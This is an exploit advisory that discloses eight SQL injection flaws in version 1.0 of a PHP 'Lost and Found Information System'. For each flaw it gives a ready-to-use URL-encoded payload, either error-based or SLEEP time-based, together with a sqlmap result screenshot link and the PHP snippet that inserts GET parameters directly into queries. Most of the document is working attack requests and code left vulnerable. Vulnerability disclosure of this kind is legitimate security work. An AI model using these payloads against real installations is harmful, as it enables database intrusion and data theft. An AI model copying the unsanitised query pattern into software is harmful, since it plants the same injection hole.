### Exploit Title: Lost and Found Information System - multiple vulnerabilities

### Date: 2023-06/09

### Exploit Author: AnotherN

### Vendor Homepage: https://www.sourcecodester.com

### Software Link: https://www.sourcecodester.com/download-code?nid=16525&title=Lost+and+Found+Information+System+using+PHP+and+MySQL+DB+Source+Code+Free+Download

### Version: 1.0

### Tested on: windows10 + phpstudy

# **1.SQL injection vulnerability in items\index.php**
---
## Sample request POC #1

```
http://php-lfis.com/?page=items&cid=1%27%20OR%20(SELECT%202608%20FROM(SELECT%20COUNT(*),CONCAT(0x717a786a71,(SELECT%20(ELT(2608=2608,1))),0x71707a6271,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)%20AND%20%27UMbA%27=%27UMbA
```
## Sqlmap running results #1

![blockchain](https://github.com/AnotherN/cvv/raw/main/imgs/1.items-index.php.jpg "Lost and Found Information System")

## Related Codes items\index.php

```
<?php 
if(isset($_GET['cid'])){
    $category_qry = $conn->query("SELECT * FROM `category_list` where `id` = '{$_GET['cid']}'");
    if($category_qry->num_rows > 0){
        foreach($category_qry->fetch_assoc() as $k => $v){
            $cat[$k] = $v; 
        }
    }
}
?>
```

# **2.SQL injection vulnerability in admin\categories\manage_category.php**
---
## Sample request POC #2

```
http://php-lfis.com/?page=admin/categories/manage_category&id=1%27%20OR%20(SELECT%205622%20FROM(SELECT%20COUNT(*),CONCAT(0x7162627871,(SELECT%20(ELT(5622=5622,1))),0x71766b6b71,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)%20AND%20%27LIVq%27=%27LIVq
```
## Sqlmap running results #2

![blockchain](https://github.com/AnotherN/cvv/blob/main/imgs/2.admin-categories-manage_category.php.jpg "Lost and Found Information System")

## Related Codes admin\categories\manage_category.php

```
<?php
if(isset($_GET['id']) && $_GET['id'] > 0){
    $qry = $conn->query("SELECT * from `category_list` where id = '{$_GET['id']}' ");
    if($qry->num_rows > 0){
        foreach($qry->fetch_assoc() as $k => $v){
            $$k=$v;
        }
    }
}
?>
```

# **3.SQL injection vulnerability in admin\categories\view_category.php**
---
## Sample request POC #3

```
http://php-lfis.com/?page=admin/categories/view_category&id=1%27%20AND%20(SELECT%209094%20FROM%20(SELECT(SLEEP(5)))psGp)%20AND%20%27osaz%27=%27osaz
```
## Sqlmap running results #3

![blockchain](https://github.com/AnotherN/cvv/blob/main/imgs/3.admin-categories-view_category.php.jpg "Lost and Found Information System")

## Related Codes admin\categories\view_category.php

```
<?php
if(isset($_GET['id']) && $_GET['id'] > 0){
    $qry = $conn->query("SELECT * from `category_list` where id = '{$_GET['id']}' ");
    if($qry->num_rows > 0){
        foreach($qry->fetch_assoc() as $k => $v){
            $$k=$v;
        }
    }else{
		echo '<script>alert("Category ID is not valid."); location.replace("./?page=categories")</script>';
	}
}else{
	echo '<script>alert("Category ID is Required."); location.replace("./?page=categories")</script>';
}
?>
```

# **4.SQL injection vulnerability in admin\inquiries\view_inquiry.php**
---
## Sample request POC #4

```
http://php-lfis.com/?page=admin/inquiries/view_inquiry&id=1%27%20AND%20(SELECT%203421%20FROM%20(SELECT(SLEEP(5)))gwaX)%20AND%20%27YVdm%27=%27YVdm
```
## Sqlmap running results #4

![blockchain](https://github.com/AnotherN/cvv/blob/main/imgs/4.admin-inquiries-view_inquiry.php.jpg "Lost and Found Information System")

## Related Codes admin\inquiries\view_inquiry.php

```
<?php
if(isset($_GET['id']) && $_GET['id'] > 0){
    $qry = $conn->query("SELECT * from `inquiry_list` where id = '{$_GET['id']}' ");
    if($qry->num_rows > 0){
        foreach($qry->fetch_assoc() as $k => $v){
            $$k=$v;
        }
		$conn->query("UPDATE `inquiry_list` set `status` = 1 where `id` = '{$id}'");
    }else{
		echo '<script>alert("inquiry ID is not valid."); location.replace("./?page=inquiries")</script>';
	}
}else{
	echo '<script>alert("inquiry ID is Required."); location.replace("./?page=inquiries")</script>';
}
?>
```

# **5.SQL injection vulnerability in admin\items\manage_item.php**
---
## Sample request POC #5

```
http://php-lfis.com/?page=admin/items/manage_item&id=1%27%20OR%20(SELECT%206925%20FROM(SELECT%20COUNT(*),CONCAT(0x716b767a71,(SELECT%20(ELT(6925=6925,1))),0x7171626b71,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)%20AND%20%27SRGH%27=%27SRGH
```
## Sqlmap running results #5

![blockchain](https://github.com/AnotherN/cvv/blob/main/imgs/5.admin-items-manage_item.php.png "Lost and Found Information System")

## Related Codes admin\items\manage_item.php

```
<?php
if(isset($_GET['id']) && $_GET['id'] > 0){
    $qry = $conn->query("SELECT * from `item_list` where id = '{$_GET['id']}' ");
    if($qry->num_rows > 0){
        foreach($qry->fetch_assoc() as $k => $v){
            $$k=$v;
        }
    }
}
?>
```

# **6.SQL injection vulnerability in admin\items\view_item.php**
---
## Sample request POC #6

```
http://php-lfis.com/?page=admin/items/view_item&id=1%27%20OR%20(SELECT%204881%20FROM(SELECT%20COUNT(*),CONCAT(0x7171707871,(SELECT%20(ELT(4881=4881,1))),0x7171626271,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)%20AND%20%27voJR%27=%27voJR
```
## Sqlmap running results #6

![blockchain](https://github.com/AnotherN/cvv/blob/main/imgs/6.admin-items-view_item.php.jpg "Lost and Found Information System")

## Related Codes admin\items\view_item.php

```
<?php
if(isset($_GET['id']) && $_GET['id'] > 0){
    $qry = $conn->query("SELECT *, COALESCE((SELECT `name` FROM `category_list` where `category_list`.`id` = `item_list`. `category_id` ) ,'N/A') as `category` from `item_list` where id = '{$_GET['id']}' ");
    if($qry->num_rows > 0){
        foreach($qry->fetch_assoc() as $k => $v){
            $$k=$v;
        }
    }else{
		echo '<script>alert("item ID is not valid."); location.replace("./?page=items")</script>';
	}
}else{
	echo '<script>alert("item ID is Required."); location.replace("./?page=items")</script>';
}
?>
```

# **7.SQL injection vulnerability in admin\user\manage_user.php**
---
## Sample request POC #7

```
http://php-lfis.com/?page=admin/user/manage_user&id=1%27%20OR%20(SELECT%201752%20FROM(SELECT%20COUNT(*),CONCAT(0x7162787071,(SELECT%20(ELT(1752=1752,1))),0x7162627871,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)%20AND%20%27BxHG%27=%27BxHG
```
## Sqlmap running results #7

![blockchain](https://github.com/AnotherN/cvv/blob/main/imgs/7.admin-user-manage_user.php.jpg "Lost and Found Information System")

## Related Codes admin\user\manage_user.php

```
<?php 
if(isset($_GET['id'])){
    $user = $conn->query("SELECT * FROM users where id ='{$_GET['id']}' ");
    foreach($user->fetch_array() as $k =>$v){
        $meta[$k] = $v;
    }
}
?>
```

# **8.SQL injection vulnerability in items\view.php**
---
## Sample request POC #8

```
http://php-lfis.com/?page=items/view&id=1%27%20OR%20(SELECT%204761%20FROM(SELECT%20COUNT(*),CONCAT(0x71766a7671,(SELECT%20(ELT(4761=4761,1))),0x7178787071,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)%20AND%20%27xIxg%27=%27xIxg
```
## Sqlmap running results #8

![blockchain](https://github.com/AnotherN/cvv/blob/main/imgs/8.items-view.php.jpg "Lost and Found Information System")

## Related Codes items\view.php

```
<?php
if(isset($_GET['id']) && $_GET['id'] > 0){
    $qry = $conn->query("SELECT *, COALESCE((SELECT `name` FROM `category_list` where `category_list`.`id` = `item_list`. `category_id` ) ,'N/A') as `category` from `item_list` where id = '{$_GET['id']}' ");
    if($qry->num_rows > 0){
        foreach($qry->fetch_assoc() as $k => $v){
            $$k=$v;
        }
    }else{
		echo '<script>alert("item ID is not valid."); location.replace("./?page=items")</script>';
	}
}else{
	echo '<script>alert("item ID is Required."); location.replace("./?page=items")</script>';
}
?>
```